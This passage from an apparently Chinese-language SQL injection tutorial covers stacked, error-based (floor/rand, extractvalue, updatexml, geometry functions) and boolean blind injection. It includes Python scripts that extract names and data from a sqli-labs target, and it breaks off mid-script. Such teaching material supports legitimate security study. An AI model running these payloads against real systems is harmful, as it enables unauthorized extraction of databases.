<p>回显了两张表，一张<code>words</code>表一张<code>1919810931114514</code>表</p>
<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210428224528059.png" alt="image-20210428224528059"></p>
<p>查询表里面的字段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show columns from `1919810931114514`#</span><br></pre></td></tr></table></figure>

<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210428224616428.png" alt="image-20210428224616428"></p>
<p>Flag就在1919810931114514表里。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;PREPARE payload from concat(&#x27;s&#x27;,&#x27;elect&#x27;, &#x27; * from `1919810931114514` &#x27;);EXECUTE payload;#</span><br></pre></td></tr></table></figure>

<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210428225720126.png" alt="image-20210428225720126"></p>
<h3 id="2-4报错注入"><a href="#2-4报错注入" class="headerlink" title="2.4报错注入"></a>2.4报错注入</h3><p>为什么要报错注入呢？因为sql会检查我们传入的语句，而且根据不同情况报告不同的错误信息。我们就可以通过构造特定的错误语句，然后根据sql报错的信息中获取我们想要的信息。</p>
<h4 id="0X01-floor-和rand"><a href="#0X01-floor-和rand" class="headerlink" title="0X01 floor()和rand()"></a>0X01 floor()和rand()</h4><ul>
<li><p><code>floor()</code>函数作用是返回小于等于该值的最大整数,也可以理解为向下取整，只保留整数部分。</p>
</li>
<li><p><code>rand(0)</code>函数可以用来生成0或1，但是rand(0)和rand()还是有本质区别的，rand(0)相当于给rand()函数传递了一个参数，然后rand()函数会根据0这个参数进行随机数成成。rand()生成的数字是完全随机的，而rand(0)是有规律的生成，我们可以在数据库中尝试一下。</p>
</li>
<li><p>首先测试rand():</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select floor(rand()*2) from userinfo;</span><br></pre></td></tr></table></figure>

<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210526231034204.png" alt="image-20210526231034204"></p>
<p>可以看到，截取部分数据分析。111100</p>
<p>再次运行，查看数据。</p>
<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210526231153417.png" alt="image-20210526231153417"></p>
<p>这次是011000。</p>
<ul>
<li>测试rand(0):</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select floor(rand(0)*2) from student;</span><br></pre></td></tr></table></figure>

<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210526231306027.png" alt="image-20210526231306027"></p>
<p>第一次截取数据为011011</p>
<p>在运行几次。数据还是一样</p>
<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210526231406468.png" alt="image-20210526231406468"></p>
<p>很显然rand(0)是伪随机的，有规律可循，这也是我们采用rand(0)进行报错注入的原因，rand(0)是稳定的，这样每次注入都会报错，而rand()是随机的，很难控制，可能达不到报错效果。</p>
<p>再来看看使用floor报错注入的payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),(concat(floor(rand()*2),(select version())))x from student group by x</span><br></pre></td></tr></table></figure>

<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210526231546085.png" alt="image-20210526231546085"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Err] 1062 - Duplicate entry &#x27;05.5.53&#x27; for key &#x27;group_key&#x27;</span><br></pre></td></tr></table></figure>

<p>我们可以看到我数据库版本号出现在了错误语句当中，那么到底是为什么他会报错呢?</p>
<p>报错语句为Duplicate entry ‘5.5.531’ for key ‘group_key’意思是说group_key条目重复，那么我们使用group by 测试下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),name from student group by `name`;</span><br></pre></td></tr></table></figure>

<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210526232016283.png" alt="image-20210526232016283"></p>
<p>我们可以看到生成了一个虚拟表，在这张虚拟表中，group by后面的字段作为主键，所以这张表中主键是name，这样我们就基本弄清报错的原因了，其原因主要是因为虚拟表的主键重复。</p>
<p>我们把这个payload拆分来看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),(concat(floor(rand()*2),(select version())))x from users group by x</span><br></pre></td></tr></table></figure>

<p>可以分为这么几部分<code>select count(*)</code>,<code>concat(floor(rand()*2),(select version()))</code>,<code>group by x</code>我们一步一步来解释<br>首先第一段select没什么讲的，COUNT(*) 函数返回表中的记录数，第二段concat用于拼接字符串，我们可以尝试在sql中使用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat_ws(&#x27;@&#x27;,version(),floor(rand()*2));</span><br></pre></td></tr></table></figure>

<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210526232649156.png" alt="image-20210526232649156"></p>
<p>可以看到该命令将version和floor的值进行了拼接，那么我们在根据group by 的特性，group by语句执行过程中，一行一行的去扫描student表的name字段，如果name在name-count()不存在，那么就将他插入，并置count()置1，如果name在name-count()表中已经存在，那么就在原来的count(*)基础上加1，就这样直到扫描完整个表，就得到我们看到的这个表了，group by后面的字段是虚拟表的主键，也就是说它是不能重复的，<strong>这是后面报错成功的关键点</strong>。</p>
<p>我们进行测试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat_ws(&#x27;@&#x27;,version(),floor(rand(0)*2))x from student;</span><br></pre></td></tr></table></figure>

<p>student表中有42条数据，我们可以看到</p>
<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210526233121086.png" alt="image-20210526233121086"></p>
<p>我们可以看到每一次生成的值是根据floor函数决定的，再结合rand(0)函数的特性，导致其随机数可以被控制，所以才有了我们上面的结果。</p>
<p><strong>mysql官方注明，在执行group by语句的时候，group by语句后面的字段会被运算两次。</strong></p>
<p><strong>第一次：</strong>我们之前说了会把group by后面的字段值拿到虚拟表中去对比，在对比之前肯定要知道group by后面字段的值，所以第一次的运算就发生在这里。<br><strong>第二次：</strong>现在假设我们下一次扫描的字段的值没有在虚拟表中出现，也就是group by后面的字段的值在虚拟表中还不存在，那么我们就需要把它插入到虚拟表中，这里在插入时会进行第二次运算，由于rand函数存在一定的随机性，所以第二次运算的结果可能与第一次运算的结果不一致，但是这个运算的结果可能在虚拟表中已经存在了，那么这时的插入必然导致错误！</p>
<p>我们测试一下</p>
<p>首先用rand(0)生成随机数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select floor(rand(0)*2) from student;</span><br></pre></td></tr></table></figure>

<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210526233504853.png" alt="image-20210526233504853"></p>
<p><strong>1、floor(rand(0)*2)进行第一次运算，floor=0，此时为floor与虚拟表进行对比，由于表中没有值，进行插入。</strong></p>
<p><strong>2、插入时，floor进行第二次运算，floor=1，插入1，count=1。</strong></p>
<p><strong>3、取floor=1，\</strong>此时为floor与虚拟表进行对比，由于存在floor=1，故**count+1。**</p>
<p><strong>4、取floor=0，\</strong>此时为floor与虚拟表进行对比，由于表中不存在floor=0，故作插入处理。****</p>
<p><strong>5、插入时，floor进行第二次运算，floor=1，但是floor=1已经存在，无法进行插入操作，故产生主键重复错误，抛出异常。</strong></p>
<p>过程如下：<br>扫描第一项第一次计算x=’5.5.53@0’(与rand(0)对应)，发现没有那么进行插入，插入是在进行计算这时x=’5.5.53@1’,那么将其插入，到这里第一次扫描完成，因为rand的随机性所以导致插入的数据为5.5.53@1，那么继续往下走，在第二次扫描这时x=’5.5.53@1’发现虚拟表中存在，那么就直接插入，不进行第二次计算，到此第二次扫描完成，第三次扫描开始，首先x=’5.5.53@0’，然后发现表中没有，那么就进行插入而插入的时候还需进行一次计算，这是x=’5.5.53@1’,那么与之前第一次计算得到的值不相同然后报错把值爆出来了。</p>
<p>所以使用floor()和rand()的示例payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT COUNT(*),CONCAT(DATABASE(),&#x27;~&#x27;,FLOOR(RAND(0)*2)) FROM `student` GROUP BY CONCAT(DATABASE(),&#x27;~&#x27;,FLOOR(RAND(0)*2))       /*利用错误信息得到当前数据库名*/</span><br></pre></td></tr></table></figure>

<p>通过设置别名，简化长度</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT COUNT(*),CONCAT(DATABASE(),&#x27;~&#x27;,FLOOR(RAND(0)*2))x FROM `student` GROUP BY x</span><br></pre></td></tr></table></figure>

<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210527224444135.png" alt="image-20210527224444135"></p>
<p>爆表名：</p>
<p>第一步爆表的个数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT COUNT(*),CONCAT((SELECT COUNT(table_name) FROM information_schema.`TABLES` where TABLE_SCHEMA=&#x27;search&#x27;),&#x27;~&#x27;,FLOOR(RAND(0)*2))x  from information_schema.`COLUMNS` GROUP BY x</span><br></pre></td></tr></table></figure>

<p>第二步爆表名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.`TABLES` where TABLE_SCHEMA=&#x27;search&#x27; LIMIT 0,1),&#x27;~&#x27;,FLOOR(RAND(0)*2))x  from information_schema.`COLUMNS` GROUP BY x //通过调整limit逐个爆出来</span><br></pre></td></tr></table></figure>

<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210527225514945.png" alt="image-20210527225514945"></p>
<p>爆列名</p>
<p>第一步爆列数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT COUNT(*),CONCAT((SELECT COUNT(column_name) FROM information_schema.`COLUMNS` where TABLE_SCHEMA=&#x27;search&#x27; and TABLE_NAME=&#x27;admin&#x27;),&#x27;~&#x27;,FLOOR(RAND(0)*2))x  from information_schema.`COLUMNS`  GROUP BY x</span><br></pre></td></tr></table></figure>

<p>第二步爆列名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT COUNT(*),CONCAT((SELECT column_name FROM information_schema.`COLUMNS` where TABLE_SCHEMA=&#x27;search&#x27; and TABLE_NAME=&#x27;admin&#x27; LIMIT 0,1),&#x27;~&#x27;,FLOOR(RAND(0)*2))x  from information_schema.`COLUMNS`  GROUP BY x</span><br></pre></td></tr></table></figure>





<h4 id="0X02-XPATH语法错误"><a href="#0X02-XPATH语法错误" class="headerlink" title="0X02 XPATH语法错误"></a>0X02 XPATH语法错误</h4><p>从mysql5.1.5开始提供两个XML查询和修改的函数，<strong>extractvalue和updatexml</strong>。extractvalue负责在xml文档中按照xpath语法查询节点内容，updatexml则负责修改查询到的内容。<br> 它们的第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里。</p>
<h5 id="ExtractValue-有长度限制-最长32位"><a href="#ExtractValue-有长度限制-最长32位" class="headerlink" title="ExtractValue(有长度限制,最长32位)"></a>ExtractValue(有长度限制,最长32位)</h5><p>原理：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xishaonian/p/6250444.html">https://www.cnblogs.com/xishaonian/p/6250444.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</span><br></pre></td></tr></table></figure>

<p>爆表数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select(extractvalue(1,concat(0x7e,(select COUNT(TABLE_NAME) from information_schema.`TABLES` where TABLE_SCHEMA=&#x27;search&#x27;),0x7e)))</span><br></pre></td></tr></table></figure>

<p>爆表名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select(extractvalue(1,concat(0x7e,(select TABLE_NAME from information_schema.`TABLES` where TABLE_SCHEMA=&#x27;search&#x27; limit 0,1),0x7e)))</span><br></pre></td></tr></table></figure>

<p>爆列数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select(extractvalue(1,concat(0x7e,(select COUNT(column_name) from information_schema.`columns` where TABLE_SCHEMA=&#x27;search&#x27; and TABLE_NAME=&#x27;admin&#x27;  ),0x7e)))</span><br></pre></td></tr></table></figure>

<p>爆列名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select(extractvalue(1,concat(0x7e,(select column_name from information_schema.`columns` where TABLE_SCHEMA=&#x27;search&#x27; and TABLE_NAME=&#x27;admin&#x27; limit 0,1),0x7e)))</span><br></pre></td></tr></table></figure>



<h5 id="UpdateXml-有长度限制-最长32位"><a href="#UpdateXml-有长度限制-最长32位" class="headerlink" title="UpdateXml(有长度限制,最长32位)"></a>UpdateXml(有长度限制,最长32位)</h5><p>原理：<a target="_blank" rel="noopener" href="https://www.jb51.net/article/125599.htm">https://www.jb51.net/article/125599.htm</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))</span><br></pre></td></tr></table></figure>



<h5 id="0x03-函数特性报错"><a href="#0x03-函数特性报错" class="headerlink" title="0x03 函数特性报错"></a>0x03 函数特性报错</h5><p>故名思义，也就是利用一些函数的特性，使其报错，得到我们想要的结果。</p>
<ul>
<li>geometrycollection()</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and geometrycollection((select * from(select * from(select user())a)b))-- + </span><br></pre></td></tr></table></figure>



<ul>
<li>multipoint()</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and multipoint((select * from(select * from(select user())a)b))-- +</span><br></pre></td></tr></table></figure>



<ul>
<li>polygon()</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and polygon (()select * from(select user ())a)b )-- +</span><br></pre></td></tr></table></figure>



<ul>
<li>multipolygon()</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and multipolygon((select * from(select * from(select user())a)b))-- +</span><br></pre></td></tr></table></figure>



<ul>
<li>linestring()</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and linestring((select * from(select * from(select user())a)b))-- +</span><br></pre></td></tr></table></figure>



<ul>
<li>multilinestring()</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and multilinestring((select * from(select * from(select user())a)b))-- +</span><br></pre></td></tr></table></figure>



<ul>
<li>exp()</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exp(~(select * from(select user())a))--+</span><br></pre></td></tr></table></figure>





<h3 id="2-5-盲注"><a href="#2-5-盲注" class="headerlink" title="2.5 盲注"></a>2.5 盲注</h3><p>盲注指的是没有回显，但是能根据我们构造的sql条件返回不同响应，而盲注跑出数据相对较麻烦，MySQL4之后大小写不敏感，可使用binary()函数使大小写敏感。盲注一般分为布尔盲注和基于时间的盲注和报错的盲注。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Length（）函数 返回字符串的长度</span><br><span class="line">Substr（）截取字符串</span><br><span class="line">Ascii（）返回字符的ascii码</span><br><span class="line">sleep(n)：将程序挂起一段时间 n为n秒</span><br><span class="line">if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</span><br></pre></td></tr></table></figure>

<p>当然如果上面的函数被禁用，也有相应的函数替换。可百度</p>
<h4 id="0x01布尔盲注"><a href="#0x01布尔盲注" class="headerlink" title="0x01布尔盲注"></a>0x01布尔盲注</h4><p>这里直接用数据库阐述原理，在实际中，如下面的例子注入点为id=1，我们已经无法使用union来直接查询，此处我们需要用到关键字and，我们知道只有and前后的条件都为真的时候，数据库才会输出结果。</p>
<ul>
<li><strong>判断数据库名的长度：</strong></li>
</ul>
<p>首先我们来判断一下数据库的是几个字符，用到length()函数，此处选取的数据库名称为search，如下图所示当判断条件为大于7时，输出为Empty，当判断条件等于6时，输出了我们查询的数据，所以数据库名的字符个数为4。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">实例：select account from admin where id=1 and length((select database()))=6，其中(select database())为子查询，需要加括号，如下图</span><br></pre></td></tr></table></figure>

<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210529223322334.png" alt="image-20210529223322334"></p>
<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210529223345008.png" alt="image-20210529223345008"></p>
<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210529223356929.png" alt="image-20210529223356929"></p>
<ul>
<li><strong>猜解数据库名：</strong></li>
</ul>
<p>我们已经知道了数据库名是6个字符，接下来我们可以使用substr()函数对数据库名的字符一个个截取。在通过ascii()函数判断字符的ascii码值,第一个字符的ascii码值为115，第二个为101，同样的步骤，第三个为97，等等类推，然后和ascii码表比对，发现数据库名为search</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">实例：select account from admin where id=1 and ascii(substr((select database()),1,1))=115，如下图</span><br></pre></td></tr></table></figure>

<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210529223743912.png" alt="image-20210529223743912"></p>
<ul>
<li><strong>猜解表名：</strong></li>
</ul>
<p>表名我们可以根据系统自带库information_schema进行查询，同理需要用到子查询，此处用到group_concat()函数拼接字符串，在这里可以把查到的数据表名通过逗号拼接起来，先猜解一下拼接的字符串长度，我们在把字符串一个个截取，最后得到一个数据表为admin</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxxx and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;100</span><br></pre></td></tr></table></figure>

<p><strong>猜解列名：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select account from admin where id=1 and (ascii(substr((select COLUMN_NAME from information_schema.`COLUMNS` where table_schema=database() and TABLE_NAME=&#x27;admin&#x27; limit 0,1),1,1)))&gt;100</span><br></pre></td></tr></table></figure>

<p>下面是爆破数据库名的脚本。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">chars=<span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~\&quot;&quot;</span></span><br><span class="line">url=<span class="string">&quot;http://61.10.10.128/sqli/Less-5/?id=1&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDbname</span>():</span><span class="comment">#爆数据库</span></span><br><span class="line">	result=<span class="string">&quot;&quot;</span></span><br><span class="line">	payload=<span class="string">&quot;&#x27;and ascii(substr(database(),&#123;0&#125;,1))=&#123;1&#125;%23&quot;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">		<span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">			newurl=url+payload.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(char))</span><br><span class="line">			response=requests.get(newurl)</span><br><span class="line">			<span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> response.content: <span class="comment">#页面判断语句记得修改</span></span><br><span class="line">				result +=char</span><br><span class="line">				<span class="built_in">print</span> <span class="string">&quot;dbname is:&quot;</span>+result</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			<span class="keyword">if</span> <span class="string">&quot;\&quot;&quot;</span> == char:</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>爆表</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getTablename</span>():</span><span class="comment">#爆表名</span></span><br><span class="line">	result=<span class="string">&quot;&quot;</span></span><br><span class="line">	payload=<span class="string">&quot;&#x27;and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;%23&quot;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">15</span>):</span><br><span class="line">		tablename=<span class="string">&quot;&quot;</span></span><br><span class="line">		flag=<span class="number">0</span></span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">			<span class="keyword">if</span> flag==<span class="number">1</span>: <span class="comment">#判断是否得到一个表名</span></span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			<span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">				newurl=url+payload.<span class="built_in">format</span>(i,j,<span class="built_in">ord</span>(char))</span><br><span class="line">				response=requests.get(newurl)</span><br><span class="line">				<span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> response.content: <span class="comment">#页面判断语句记得修改</span></span><br><span class="line">					tablename +=char</span><br><span class="line">					<span class="built_in">print</span> <span class="string">&quot;tablename is:&quot;</span>+tablename </span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">				<span class="keyword">if</span> <span class="string">&quot;\&quot;&quot;</span> == char:</span><br><span class="line">					flag=<span class="number">1</span></span><br><span class="line">					result +=<span class="string">&quot; &quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;:&quot;</span>+tablename</span><br><span class="line">					<span class="keyword">if</span> tablename.strip()==<span class="string">&#x27;&#x27;</span>:</span><br><span class="line">						<span class="keyword">return</span></span><br><span class="line">					<span class="built_in">print</span> result</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>爆字段</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getColumns</span>(<span class="params">tablename</span>):</span></span><br><span class="line">	result=<span class="string">&quot;&quot;</span></span><br><span class="line">	payload=<span class="string">&quot;&#x27;and ascii(substr((select column_name from information_schema.columns where table_name=&quot;</span>+tablename+<span class="string">&quot; limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;%23&quot;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">15</span>):</span><br><span class="line">		columnname=<span class="string">&quot;&quot;</span></span><br><span class="line">		flag=<span class="number">0</span></span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">			<span class="keyword">if</span> flag==<span class="number">1</span>: <span class="comment">#判断是否得到一个表名</span></span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			<span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">				newurl=url+payload.<span class="built_in">format</span>(i,j,<span class="built_in">ord</span>(char))</span><br><span class="line">				response=requests.get(newurl)</span><br><span class="line">				<span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> response.content: <span class="comment">#页面判断语句记得修改</span></span><br><span class="line">					columnname +=char</span><br><span class="line">					<span class="built_in">print</span> tablename+<span class="string">&quot;&#x27;columns is:&quot;</span>+columnname</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">				<span class="keyword">if</span> <span class="string">&quot;\&quot;&quot;</span> == char:</span><br><span class="line">					flag=<span class="number">1</span></span><br><span class="line">					result +=<span class="string">&quot; &quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;:&quot;</span>+columnname</span><br><span class="line">					<span class="built_in">print</span> result</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>爆数据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getData</span>(<span class="params">columnname,tablename</span>):</span></span><br><span class="line">	result=<span class="string">&quot;&quot;</span></span><br><span class="line">	payload=<span class="string">&quot;&#x27;and ascii(substr((select &quot;</span>+columnname+<span class="string">&quot;from &quot;</span>+tablename+<span class="string">&quot; limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;%23&quot;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">15</span>):</span><br><span class="line">		data=<span class="string">&quot;&quot;</span></span><br><span class="line">		flag=<span class="number">0</span></span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">			<span class="keyword">if</span> flag==<span class="number">1</span>: <span class="comment">#判断是否得到一个表名</span></span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			<span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">				newurl=url+payload.<span class="built_in">format</span>(i,j,<span class="built_in">ord</span>(char))</span><br><span class="line">				response=requests.get(newurl)</span><br><span class="line">				<span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> response.content: <span class="comment">#页面判断语句记得修改</span></span><br><span class="line">					data +=char</span><br><span class="line">					<span class="built_in">print</span> <span class="string">&quot;data is:&quot;</span>+data</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">				<span class="keyword">if</span> <span class="string">&quot;\&quot;&quot;</span> == char:</span><br><span class="line">					flag=<span class="number">1</span></span><br><span class="line">					